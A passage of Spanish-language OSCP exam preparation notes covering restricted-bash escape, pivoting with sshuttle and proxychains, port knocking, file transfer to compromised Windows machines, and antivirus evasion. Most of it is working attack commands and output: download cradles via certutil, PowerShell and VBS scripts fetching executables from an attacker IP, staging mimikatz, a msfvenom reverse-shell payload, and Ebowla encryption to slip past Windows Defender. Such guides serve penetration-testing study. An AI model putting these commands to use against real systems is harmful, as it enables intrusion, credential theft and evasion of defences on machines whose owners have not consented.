<pre><code>testuser@parrot:~$ export\ndeclare -x DBUS_SESSION_BUS_ADDRESS=\"unix:path=/run/user/1002/bus\"\ndeclare -x HOME=\"/home/testuser\"\ndeclare -x LANG=\"es_ES.UTF-8\"\ndeclare -x LOGNAME=\"testuser\"\ndeclare -x MAIL=\"/var/mail/testuser\"\ndeclare -x OLDPWD\ndeclare -rx PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin\"\ndeclare -x PWD=\"/home/testuser\"\ndeclare -rx SHELL=\"/bin/rbash\"\ndeclare -x SHLVL=\"1\"\ndeclare -x SSH_CLIENT=\"::1 48084 22\"\ndeclare -x SSH_CONNECTION=\"::1 48084 ::1 22\"\ndeclare -x SSH_TTY=\"/dev/pts/1\"\ndeclare -x TERM=\"xterm\"\ndeclare -x USER=\"testuser\"\ndeclare -x XDG_DATA_DIRS=\"/usr/local/share:/usr/share:/var/lib/snapd/desktop\"\ndeclare -x XDG_RUNTIME_DIR=\"/run/user/1002\"\ndeclare -x XDG_SESSION_ID=\"80\"\ntestuser@parrot:~$ \n</code></pre> <p>Tal y como vemos en la variable SHELL, tenemos la restricted bash. Si un administrador de sistemas asigna esta shell a un usuario, en un principio se topar\u00eda con estos inconvenientes:</p> <pre><code>testuser@parrot:~$ pwd\n/home/testuser\ntestuser@parrot:~$ cd\n-rbash: cd: restringido\ntestuser@parrot:~$ cd ..\n-rbash: cd: restringido\ntestuser@parrot:~$ cd /\n-rbash: cd: restringido\ntestuser@parrot:~$ echo prueba &gt; fichero.txt\n-rbash: fichero.txt: restringido: no se puede redirigir la salida\ntestuser@parrot:~$ touch fichero\ntestuser@parrot:~$ mkdir directorio\ntestuser@parrot:~$ ls -l\ntotal 4\ndrwxr-xr-x 2 testuser testuser 4096 nov 11 23:52 directorio\n-rw-r--r-- 1 testuser testuser    0 nov 11 23:52 fichero\n</code></pre> <p>Existen ciertos inconvenientes en cuanto a movilidad respecta, aunque s\u00ed que es cierto que en cuanto a visualizaci\u00f3n, podemos visualizar cualquier recurso del sistema sin mayor inconveniente. Un administrador de sistemas poco experimentado, podr\u00eda no tener en cuenta lo siguiente:</p> <pre><code>testuser@parrot:~$ echo $SHELL\n/bin/rbash\ntestuser@parrot:~$ cd ..\n-rbash: cd: restringido\ntestuser@parrot:~$ bash\ntestuser@parrot:~$ pwd\n/home/testuser\ntestuser@parrot:~$ cd ..\ntestuser@parrot:/home$ ls\ns4vitar  testuser\ntestuser@parrot:/home$ cd /\ntestuser@parrot:/$ pwd\n/\ntestuser@parrot:/$ \n</code></pre> <p>Con la misma, el usuario se ha escapado a una bash, teniendo mayor movilidad sobre el sistema. Es por ello que como buena medida, adem\u00e1s de asignar dicha Shell se haga algo como esto:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/testuser]\n\u2514\u2500\u2500\u257c #pwd\n/home/testuser\n\u250c\u2500[root@parrot]\u2500[/home/testuser]\n\u2514\u2500\u2500\u257c #mkdir bin\n\u250c\u2500[root@parrot]\u2500[/home/testuser]\n\u2514\u2500\u2500\u257c #cd !$\ncd bin\n\u250c\u2500[root@parrot]\u2500[/home/testuser/bin]\n\u2514\u2500\u2500\u257c #cp /bin/ping .\n\u250c\u2500[root@parrot]\u2500[/home/testuser/bin]\n\u2514\u2500\u2500\u257c #cp /usr/bin/tee .\n\u250c\u2500[root@parrot]\u2500[/home/testuser/bin]\n\u2514\u2500\u2500\u257c #cp /bin/ls .\n\u250c\u2500[root@parrot]\u2500[/home/testuser/bin]\n\u2514\u2500\u2500\u257c #ls\nls  ping  tee\n\u250c\u2500[root@parrot]\u2500[/home/testuser/bin]\n\u2514\u2500\u2500\u257c #chmod o+w ping\n\u250c\u2500[root@parrot]\u2500[/home/testuser/bin]\n\u2514\u2500\u2500\u257c #cd ..\n\u250c\u2500[root@parrot]\u2500[/home/testuser]\n\u2514\u2500\u2500\u257c #echo -e \"PATH=/home/testuser/bin\\nexport PATH\" &gt; .bashrc\n\u250c\u2500[root@parrot]\u2500[/home/testuser]\n\u2514\u2500\u2500\u257c #cat .bashrc\nPATH=/home/testuser/bin\nexport PATH\n</code></pre> <p>Como vemos en este caso el administrador de sistemas ha decidido que s\u00f3lo pueda ejecutar esos 3 comandos (ls ping tee). </p> <p>Este caso es a modo de ejemplo, y la asignaci\u00f3n de permisos de escritura por parte de otros al binario ping se ha hecho a posta para que se vea c\u00f3mo por esta simple tonter\u00eda un usuario podr\u00eda escapar de la restricted bash.</p> <p>Veamos c\u00f3mo ser\u00eda la movilidad a nivel de usuario:</p> <pre><code>testuser@parrot:~$ echo $PATH\n/home/testuser/bin\ntestuser@parrot:~$ ls\nbin\ntestuser@parrot:~$ cat .bashrc\nrbash: cat: no se encontr\u00f3 la orden\ntestuser@parrot:~$ cat /etc/passwd\nrbash: cat: no se encontr\u00f3 la orden\ntestuser@parrot:~$ cd ..\nrbash: cd: restringido\ntestuser@parrot:~$ cd /\nrbash: cd: restringido\ntestuser@parrot:~$ touch archivo\nrbash: touch: no se encontr\u00f3 la orden\ntestuser@parrot:~$ mkdir directorio\nrbash: mkdir: no se encontr\u00f3 la orden\ntestuser@parrot:~$ ls bin\nls  ping  tee\ntestuser@parrot:~$ ping -c 1 localhost\nping: socket: Operaci\u00f3n no permitida\ntestuser@parrot:~$ ping localhost\nping: socket: Operaci\u00f3n no permitida\ntestuser@parrot:~$ \n</code></pre> <p>El usuario est\u00e1 mucho m\u00e1s limitado, pues sus binarios se encuentran bajo el directorio /bin de su home y s\u00f3lo puede ejecutar 3 comandos muy b\u00e1sicos. Como vemos, el usuario testuser no puede visualizar el recurso .bashrc, donde est\u00e1 definido su PATH. Esto es as\u00ed debido a que no puede ejecutar el comando cat.</p> <p>Sin embargo, aprovechando el permiso que el administrador del sistema asign\u00f3 al binario ping, el usuario puede hacer lo siguiente para visualizar el recurso a modo de ejemplo:</p> <pre><code>testuser@parrot:~$ ls -l bin\ntotal 240\n-rwxr-xr-x 1 root root 138856 nov 11 23:59 ls\n-rwxr-xrwx 1 root root  65272 nov 11 23:56 ping\n-rwxr-xr-x 1 root root  39648 nov 11 23:57 tee\ntestuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping\n#!/bin/bash\ntestuser@parrot:~$ echo '/bin/cat /home/testuser/.bashrc' | tee -a bin/ping\n/bin/cat /home/testuser/.bashrc\ntestuser@parrot:~$ ping\nPATH=/home/testuser/bin\nexport PATH\ntestuser@parrot:~$ \n</code></pre> <p>Dado que algo t\u00edpico en el rbash es el no poder utilizar los operadores &gt; / &gt;&gt; para redirigir la salida de comandos, el usuario se puede aprovechar de la utilidad de rbash para depositar contenido sobre su directorio personal, as\u00ed como sobre el recurso ping situado en el directorio bin/. </p> <p>De esta forma, dado que la variable PATH figura sobre dicho directorio, puede hacer que el binario ping tome una nueva funcionalidad, donde como vemos, se aprovecha de la misma para visualizar el recurso .bashrc. Una vez ve que el problema radica en dicho recurso, puede aplicar el siguiente movimiento lateral:</p> <pre><code>testuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping\n#!/bin/bash\ntestuser@parrot:~$ echo '/bin/rm /home/testuser/.bashrc' | tee -a bin/ping\n/bin/rm /home/testuser/.bashrc\ntestuser@parrot:~$ ls -a\n.  ..  .bash_history  .bashrc  bin  .gnupg\ntestuser@parrot:~$ ping\n/bin/rm: \u00bfborrar el fichero regular '/home/testuser/.bashrc'  protegido contra escritura? (s/n) s\ntestuser@parrot:~$ ls -a\n.  ..  .bash_history  bin  .gnupg\ntestuser@parrot:~$ \n</code></pre> <p>Una vez logra borrar el .bashrc, el siguiente objetivo es configurar una nueva variable de entorno SHELL, con la shell deseada, de la siguiente forma:</p> <pre><code>testuser@parrot:~$ echo 'export SHELL=bash' | tee '/home/testuser/.bashrc'\nexport SHELL=bash\ntestuser@parrot:~$ echo $SHELL\n/bin/rbash\ntestuser@parrot:~$ exit\nexit\n\u250c\u2500[root@parrot]\u2500[/home/testuser]\n\u2514\u2500\u2500\u257c #su testuser\ntestuser@parrot:~$ echo $SHELL\nbash\ntestuser@parrot:~$ cd ..\nrbash: cd: restringido\ntestuser@parrot:~$ cd /\nrbash: cd: restringido\ntestuser@parrot:~$ echo $PATH\n/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin\n</code></pre> <p>Ahora mismo, el usuario posee una bash tal y como figura en su variable de entorno SHELL, sin embargo, por alguna raz\u00f3n... sigue estando con las mismas restricciones. Llegados a este punto, lo \u00fanico que debe hacer es el t\u00edpico shell spawning aprovechando la utilidad de alg\u00fan otro binario, dado que su PATH ahora cuenta con todas las rutas absolutas de los binarios del sistema.</p> <p>Para el siguiente caso, lo hacemos aprovechando la utilidad -exec del comando find:</p> <pre><code>testuser@parrot:~$ cd ..\nrbash: cd: restringido\ntestuser@parrot:~$ find /etc/passwd -exec /bin/bash \\;\ntestuser@parrot:~$ pwd\n/home/testuser\ntestuser@parrot:~$ cd ..\ntestuser@parrot:/home$ ls\ns4vitar  testuser\ntestuser@parrot:/home$ export\ndeclare -x COLORTERM=\"truecolor\"\ndeclare -x DISPLAY=\":0.0\"\ndeclare -x HOME=\"/home/testuser\"\ndeclare -x LANG=\"es_ES.UTF-8\"\ndeclare -x LOGNAME=\"testuser\"\ndeclare -x LS_COLORS=\"rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:\"\ndeclare -x MAIL=\"/var/mail/testuser\"\ndeclare -x OLDPWD=\"/home/testuser\"\ndeclare -x PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin\"\ndeclare -x PWD=\"/home\"\ndeclare -x SHELL=\"bash\"\ndeclare -x SHLVL=\"3\"\ndeclare -x SUDO_COMMAND=\"/bin/su\"\ndeclare -x SUDO_GID=\"1000\"\ndeclare -x SUDO_UID=\"1000\"\ndeclare -x SUDO_USER=\"s4vitar\"\ndeclare -x TERM=\"xterm\"\ndeclare -x USER=\"testuser\"\ndeclare -x USERNAME=\"root\"\ndeclare -x XAUTHORITY=\"/home/s4vitar/.Xauthority\"\ntestuser@parrot:/home$ \n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#pivoting-con-shuttle","title":"Pivoting con Shuttle","text":"<p>Aunque en el examen no caer\u00e1n temas de Pivoting, nunca viene mal tener este concepto claro para saltar a otras redes (de cara a la m\u00e1quinas del laboratorio para saltar a los distintos segmentos).</p> <p>Yo en verdad no suelo ser muy partidario de esta herramienta, lo que suelo hacer en su defecto es aplicar un 'Dynamic Port Forwarding', de este modo sobre el sistema:</p> <pre><code>ssh -D 1080 usuario@host\n</code></pre> <p>Y dir\u00e9is, ah... pero hay que conocer la password. Obviamente... si comprometes un equipo, ser\u00e1 a fondo, lo mismo suceder\u00e1 con Shuttle.</p> <p>Una vez hecha la conexi\u00f3n, tendremos que aplicar la siguiente configuraci\u00f3n desde el fichero '/etc/proxychains.conf':</p> <pre><code>[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\nsocks4  127.0.0.1 1080\n</code></pre> <p>De esta forma, conseguimos que a la hora de aplicar la siguiente sintaxis sobre un Host al que no deber\u00edamos tener conectividad:</p> <pre><code>$~ proxychains ssh root@ipOtroSegmento\n</code></pre> <p>Tengamos alcance y nos resuelva el servicio. Para los escaneos con nmap sucede lo mismo, solo que hay que a\u00f1adir una ligera variaci\u00f3n en cuanto a par\u00e1metros respecta:</p> <pre><code>$~ proxychains nmap -p21,80,443 -r -v --open -T5 -v -Pn -T5 -n -oG openPorts\n</code></pre> <p>Tendremos que a\u00f1adir los par\u00e1metros '-T5 -Pn' generalmente, lo mismo para escanear a fondo dichos puertos:</p> <pre><code>$~ proxychains nmap -p21,80,443 -Pn -T5 -sC -sV\n</code></pre> <p>Dicho esto, explico el uso de Shuttle. Supongamos que acabamos de comprometer el sistema 192.168.1.X, tenemos las credenciales del usuario pepe para conexi\u00f3n por SSH y descubrimos que desde dicho sistema tenemos conectividad con un nuevo segmento 10.2.15.0/24. Una vez teniendo shuttle en nuestro sistema, lo \u00fanico que tendremos que hacer es lo siguiente:</p> <pre><code>sshuttle -vr pepe@192.168.1.X:22000 10.2.15.1/24 -x 192.168.1.X\n</code></pre> <p>Donde el par\u00e1metro '-x' es opcional, por el cual especificamos la propia IP del sistema para descartarla posteriormente del rango de conectividad. (Una tonter\u00eda, pero bueno)</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#port-knocking","title":"Port Knocking","text":"<p>Que no falte mencionar esta famosa practica para ocultar puertos. Para que sea entendible la utilidad sin entrar mucho a nivel t\u00e9cnico, digamos que tenemos un VPS por el cual accedemos normalmente por el puerto 22 hacia el servicio SSH. \u00bfQu\u00e9 sucede?, que el servicio queda p\u00fablico de cara hacia fuera. Una pr\u00e1ctica para proteger estos servicios es configurar una serie de puertos (generalmente 3), para de golpearlos hacer visible temporalmente estos servicios.</p> <p>Me explico, supongamos que tras un escaneo inicial, vemos que el puerto 22 para el servicio SSH figura como 'closed'. Sin embargo, por X razones, sabemos que de aplicar un Port Knocking sobre los puertos 4264 4563 5798, el puerto 22 se abre temporalmente permitiendo conexiones entrantes al servicio.</p> <p>\u00bfC\u00f3mo hacemos para golpear dichos puertos y realizar la conexi\u00f3n?</p> <p>Los hay quienes se montan un script infumable, realmente no hace falta:</p> <pre><code>$~ nmap -p4264,4563,5798 -r -T5 -PN &amp;&amp; ssh usuario@ip\n</code></pre> <p>Con hacer esto, se habilitar\u00eda temporalmente el servicio SSH sobre el puerto 22, visualizando la conexi\u00f3n asociada as\u00ed como la autenticaci\u00f3n para validar el usuario.</p> <p>Como nmap a veces es muy suyo y no sigue el orden fijado de puertos a escanear, asignamos el par\u00e1metro '-n' para que el Port Knocking haga efecto, pues en caso de golpearlos en el orden incorrecto simplemente no suceder\u00e1 nada.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#pentesting-windows","title":"Pentesting Windows","text":"<p>A pesar de implementar y poner en pr\u00e1ctica otras t\u00e9cnicas que no describo en los siguiente puntos, enumero a continuaci\u00f3n las que para mi son m\u00e1s importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, as\u00ed como de cara al examen.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#transferencia-de-archivos","title":"Transferencia de Archivos","text":"<p>Tenemos distintas formas de transferir archivos desde la m\u00e1quina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de certutil, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la m\u00e1quina Windows:</p> <p><code>certutil.exe -f -urlcache -split http://nuestraIP:puerto/recurso.exe output.exe</code></p> <p>En caso de no contar con certutil, podemos montarnos un servicio FTP en local, para posteriormente desde la m\u00e1quina Windows v\u00eda FTP obtener los recursos. Para ello, tendremos que crear un archivo .txt sobre la m\u00e1quina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):</p> <pre><code>open 192.168.1.45 21\nuser s4vitar\npassword\nbinary\nGET archivo\nbye\n</code></pre> <p>Para ello, simplemente desde el CMD vamos haciendo lo siguiente:</p> <pre><code>echo open 192.168.1.45 21 &gt; ftp.txt\necho user s4vitar &gt;&gt; ftp.txt\necho password &gt;&gt; ftp.txt\necho binary &gt;&gt; ftp.txt\necho GET archivo &gt;&gt; ftp.txt\necho bye &gt;&gt; ftp.txt\n</code></pre> <p>Para que se realicen los pasos fijados sobre el fichero, es necesario desde la m\u00e1quina Windows aplicar el siguiente comando:</p> <pre><code>ftp -v -n -s:ftp.txt\n</code></pre> <p>Una vez hecho, se realizar\u00e1 la transferencia y tendremos el recurso en la m\u00e1quina Windows. Lo mismo habr\u00eda valido para enviar archivos a nuestra m\u00e1quina local.</p> <p>En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la m\u00e1quina Linux:</p> <pre><code>python -m pyftpdlib -p 21 -w\n</code></pre> <p>Posteriormente, ejecutamos las mismas instrucciones del lado de la m\u00e1quina comprometida.</p> <p>Otra v\u00eda para realizar la transferencia de archivos desde nuestra m\u00e1quina de atacante a la m\u00e1quina Windows comprometida es aprovecharse de la utilidad TFTP. Para ello, desde nuestra m\u00e1quina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:</p> <pre><code>atftpd --daemon --port 69 /tftp\n</code></pre> <p>Una vez hecho, desde la m\u00e1quina Windows, aplicamos el siguiente comando:</p> <pre><code>tftp -i 192.168.1.45 GET nc.exe\n</code></pre> <p>Otra v\u00eda para realizar transferencia de archivos es desde nuestra m\u00e1quina de atacante, compartir los recursos a trav\u00e9s de un servidor web v\u00eda Python:</p> <pre><code>python -m SimpleHTTPServer 443\n</code></pre> <p>Y desde la m\u00e1quina Windows, aplicar los siguientes comandos de Powershell:</p> <pre><code>powershell -c \"(new-object  System.Net.WebClient).DownloadFile('http://192.168.1.45:443/file.exe','C:\\Users\\user\\Desktop\\file.exe')\"\n\n# Tambi\u00e9n podemos usar esta otra forma\npowershell Invoke-WebRequest \"http://192.168.1.45:443/file.exe\" -OutFile \"C:\\Users\\user\\Desktop\\file.exe\"\n</code></pre> <p>Por si todas estas v\u00edas de transferencia de archivos se nos quedan cortas, podemos hacerlo a trav\u00e9s de un script en VBS, que suele funcionar para la mayor\u00eda de las veces. Para ello, desde la m\u00e1quina Windows, tendremos que aplicar las siguientes instrucciones:</p> <pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs\necho StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs\necho Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs\necho Err.Clear &gt;&gt; wget.vbs\necho Set http = Nothing &gt;&gt; wget.vbs\necho Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") &gt;&gt; wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") &gt;&gt; wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") &gt;&gt; wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; wget.vbs\necho http.Open \"GET\",strURL,False &gt;&gt; wget.vbs\necho http.Send &gt;&gt; wget.vbs\necho varByteArray = http.ResponseBody &gt;&gt; wget.vbs\necho Set http = Nothing &gt;&gt; wget.vbs\necho Set fs = CreateObject(\"Scripting.FileSystemObject\") &gt;&gt; wget.vbs\necho Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs\necho strData = \"\" &gt;&gt; wget.vbs\necho strBuffer = \"\" &gt;&gt; wget.vbs\necho For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs\necho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs\necho Next &gt;&gt; wget.vbs\necho ts.Close &gt;&gt; wget.vbs\n</code></pre> <p>Una vez definido el recurso wget.vbs, aplicamos el siguiente comando para una vez montando nuestro servidor web v\u00eda Python en la m\u00e1quina atacante, descargar los recursos que consideremos:</p> <pre><code>cscript wget.vbs http://192.168.1.45:443/file.exe file.exe\n</code></pre> <p>Por si vemos que es mucha molestia estar definiendo todo el script wget.vbs, podemos acotarlo de la siguiente forma, y funcionar\u00e1 igualmente:</p> <pre><code>echo var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\"); &gt; wget.vbs\necho WinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false); &gt;&gt; wget.vbs\necho WinHttpReq.Send(); &gt;&gt; wget.vbs\necho WScript.Echo(WinHttpReq.ResponseText); &gt;&gt; wget.vbs\necho BinStream = new ActiveXObject(\"ADODB.Stream\"); &gt;&gt; wget.vbs\necho BinStream.Type = 1; &gt;&gt; wget.vbs\necho BinStream.Open(); &gt;&gt; wget.vbs\necho BinStream.Write(WinHttpReq.ResponseBody); &gt;&gt; wget.vbs\necho BinStream.SaveToFile(\"out.bin\"); &gt;&gt; wget.vbs\n</code></pre> <p>Una vez hecho, desde la propia m\u00e1quina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:</p> <pre><code>cscript /nologo wget.js http://192.168.1.45:443/recurso.exe\n</code></pre> <p>En caso de haber ganado acceso al equipo Windows con nishang aprovechando la utilidad Invoke-PowerShellTcp.ps1 (aunque tambi\u00e9n sirve para consola normal, s\u00f3lo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando smbserver de Impacket.</p> <p>Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado espec\u00edfico para la compartici\u00f3n de archivos:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/smb]\n\u2514\u2500\u2500\u257c #impacket-smbserver shared `pwd`\nImpacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre> <p>A continuaci\u00f3n, desde la m\u00e1quina Windows desde la sesi\u00f3n Powershell, aplicamos el siguiente comando:</p> <pre><code>New-PSDrive -Name \"SharedFolder\" -PSProvider \"FileSystem\" -Root \"\\\\192.168.1.45\\shared\"\n</code></pre> <p>Directamente, veremos como se llevar\u00e1 a cabo una sincronizaci\u00f3n de recursos, creando una unidad l\u00f3gica SharedFolder:\\ sobre el equipo Windows que se conecta a nuestra unidad l\u00f3gica pwd, la cual sincroniza contra la unidad f\u00edsica donde se sit\u00faa nuestro directorio shared, desde donde depositaremos nuestros archivos.</p> <p>En primer lugar, cambiamos de unidad l\u00f3gica en la m\u00e1quina Windows:</p> <pre><code>cd SharedFolder:\n</code></pre> <p>Posteriormente, nos traemos al equipo los recursos que consideremos:</p> <pre><code>move mimikatz.exe C:\\Users\\s4vitar\\Desktop\\mimikatz.exe\n</code></pre> <p>Podemos no complicar tanto las cosas, haciendo uso para ello del siguiente procedimiento (A modo de ejemplo, ejecutamos en remoto a tiempo real sobre el equipo Windows el binario accesschk_v5.02.exe:</p> <pre><code>$~ smbserver.py parrotSmbFolder ~/Recurso/ # Especificamos el directorio cuyos recursos queremos compartir\nC:\\DOCUME~1\\ \\\\IP\\parrotSmbFolder\\accesschk_v5.02.exe -accepteula -uwqs \"usuario\" C:\\*.*\n</code></pre> <p>Esto a su vez nos sirve para copiar archivos del recurso compartido por Samba.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#av-evasion-genetic-malware","title":"AV Evasion Genetic Malware","text":"<p>A continuaci\u00f3n, se detalla el procedimiento para crear Malware Gen\u00e9tico, ideal y de utilidad para la evasi\u00f3n de antivirus as\u00ed como del propio Windows Defender.</p> <p>Para ello, necesitamos descargar en local el recurso Ebowla, as\u00ed como tener instalado GO para la forma en la que compilaremos nuestro Malware.</p> <p>Cuando todo est\u00e9 preparado, una vez comprometida la m\u00e1quina Windows, suponiendo para un caso pr\u00e1ctico que tenemos que subir un archivo .exe para haciendo uso de RottenPotato poder escalar privilegios pasando como argumento dicho binario (el cual ser\u00e1 ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecuci\u00f3n del binario, lo primero ser\u00e1 crear nuestro Malware desde msfvenom:</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f exe -o shell.exe\n</code></pre> <p>Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la m\u00e1quina Windows:</p> <pre><code>C:\\Users\\s4vitar\\Desktop\\ hostname\nPC-S4vitar\n</code></pre> <p>Ya conociendo el hostname, llevamos a cabo antes que nada un par de configuraciones a nivel de archivos sobre los recursos que trae ebowla. Abrimos en primer lugar el archivo genetic.config, cambiando las variables output_type y payload_type por las siguientes:</p> <pre><code>output_type = GO\npayload_type = EXE\n</code></pre> <p>Una vez hecho, bajamos hasta la secci\u00f3n de variables de entorno:</p> <pre><code>    [[ENV_VAR]]\n\n        username = ''\n        computername = ''\n        homepath = ''\n        homedrive = ''\n        Number_of_processors = ''\n        processor_identifier = ''\n        processor_revision = ''\n        userdomain = ''\n        systemdrive = ''\n        userprofile = ''\n        path = ''\n        temp = ''\n\n\n     [[PATH]]\n</code></pre> <p>En este caso, dado que a modo de ejemplo vamos a jugar \u00fanicamente con la variable hostname, introducimos su valor en la variable correspondiente:</p> <pre><code>    [[ENV_VAR]]\n\n        username = ''\n        computername = 'PC-S4vitar'\n        homepath = ''\n        homedrive = ''\n        Number_of_processors = ''\n        processor_identifier = ''\n        processor_revision = ''\n        userdomain = ''\n        systemdrive = ''\n        userprofile = ''\n        path = ''\n        temp = ''\n\n\n     [[PATH]]\n</code></pre> <p>IMPORTANTE: Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a trav\u00e9s de las propias variables de entorno. Esto quiere decir, que tras la ejecuci\u00f3n del binario en la m\u00e1quina comprometida, este se encargar\u00e1 de descifrar todo el ejecutable a trav\u00e9s de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecuci\u00f3n del binario no ser\u00e1 funcional.</p> <p>Una vez hecho, aplicamos el siguiente comando desde consola:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]\n\u2514\u2500\u2500\u257c #python ebowla.py shell.exe genetic.config \n[*] Using Symmetric encryption\n[*] Payload length 73802\n[*] Payload_type exe\n[*] Using EXE payload template\n[*] Used environment variables:\n    [-] environment value used: computername, value used: pc-s4vitar\n[!] Path string not used as pasrt of key\n[!] External IP mask NOT used as part of key\n[!] System time mask NOT used as part of key\n[*] String used to source the encryption key: pc-s4vitar\n[*] Applying 10000 sha512 hash iterations before encryption\n[*] Encryption key: 026a42181e07e73b5c926bc8fa30017b05e7e276c18fc29ab3e62e6b8e8436f9\n[*] Writing GO payload to: go_symmetric_shell.exe.go\n</code></pre> <p>Este paso, lo que har\u00e1 ser\u00e1 crearnos un archivo go_symmetric_shell.exe.go en el directorio output. Una vez creado, aplicamos el siguiente comando para compilar el binario final:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]\n\u2514\u2500\u2500\u257c #./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe\n[*] Copy Files to tmp for building\n[*] Building...\n[*] Building complete\n[*] Copy finalshell.exe to output\n[*] Cleaning up\n[*] Done\n</code></pre> <p>Obteniendo un ejecutable final finalshell.exe, el cual podemos transferir posteriormente a la m\u00e1quina Windows.</p> <p>Es importante que la ruta del binario go est\u00e9 configurada en el PATH, pues en caso contrario no lo 